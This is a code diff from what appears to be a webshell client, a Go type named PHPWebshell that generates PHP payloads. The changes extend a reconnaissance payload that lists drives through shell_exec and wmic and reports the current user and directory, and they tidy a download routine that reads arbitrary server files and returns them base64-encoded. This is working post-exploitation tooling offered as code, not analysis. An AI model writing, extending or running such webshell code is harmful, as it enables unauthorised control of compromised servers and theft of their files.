@@ -30,8 +30,22 @@ function getSystemEnvVars() {
     }
     return $envVars;
 }
+$rootDirs = [];
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+	$drives = explode(" ", shell_exec("wmic logicaldisk get caption"));
+	foreach ($drives as $drive) {
+        $drive = trim($drive); 
+        if ($drive!="" && $drive !== 'Caption') {
+            $rootDirs[] = $drive;
+        }
+	}
+} else {
+	$rootDirs[] = '/';
+}
 $data=array(
-    "fileRoot"=> realpath("/"),
+    "currentFileRoot"=> realpath("/"),
+	"systemType"=>(strpos(PHP_OS, 'Linux') !== false) ? 0 : (strpos(PHP_OS, 'WIN') !== false) ? 1 : 2,
+	"fileRoots"=> $rootDirs,
     "currentDir"=>getcwd(),
     "currentUser"=>get_current_user(),
     "processArch"=>(PHP_INT_SIZE * 8),
@@ -161,27 +175,22 @@ if ($chunkIndex == $totalChunks - 1) {
 func (p *PHPWebshell) Download(path string) []byte {
 	code := fmt.Sprintf(`
 $path = "%s";
-
 if (!file_exists($path)) {
     echo "Error://[File not found]";
     exit;
 }
-
 $fileSize = filesize($path);
 $content = file_get_contents($path);
-
 if ($content === false) {
     echo "Error://[Failed to read file]";
     exit;
 }
-
-// 返回文件信息和base64编码的数据
 $response = array(
     "fileSize" => $fileSize,
     "data" => base64_encode($content)
 );
-
-echo json_encode($response);`, path)
+echo json_encode($response);
+`, path)
 	return []byte(code)
 }
 
